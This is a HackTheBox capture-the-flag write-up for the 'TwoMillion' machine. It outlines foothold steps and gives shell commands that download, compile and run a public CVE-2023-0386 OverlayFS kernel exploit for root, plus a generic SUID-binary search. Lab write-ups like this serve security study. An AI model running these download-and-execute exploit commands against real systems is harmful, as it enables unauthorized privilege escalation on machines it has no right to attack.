# HackTheBox - TwoMillion

## Initial Foothold

Watch the video for detailed enumeration and JavaScript deobfuscation walkthrough:
https://youtu.be/tun4ORWFb58

Key steps:
- Enumerate the web application
- Deobfuscate JavaScript to discover hidden API endpoints
- Exploit command injection vulnerability in admin API

## Privilege Escalation

### Method 1: Kernel Exploit (CVE-2023-0386)

Exploit OverlayFS vulnerability to gain root access.
```bash
# Download and compile the exploit
wget https://github.com/xkaneiki/CVE-2023-0386/archive/refs/heads/main.zip
unzip main.zip
cd CVE-2023-0386-main

# Compile
make all

# Run the exploit
./fuse ./ovlcap/lower ./gc
```

### Method 2: SUID Binary Exploitation

Find SUID binaries on the system:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Exploit the SUID binary (show full path):
```bash
# Example if /usr/bin/example is SUID
/usr/bin/example [options]

# Check GTFOBins for exploitation techniques
# https://gtfobins.github.io/
```

---

**Note:** Replace `/usr/bin/example` with the actual SUID binary path found during enumeration.
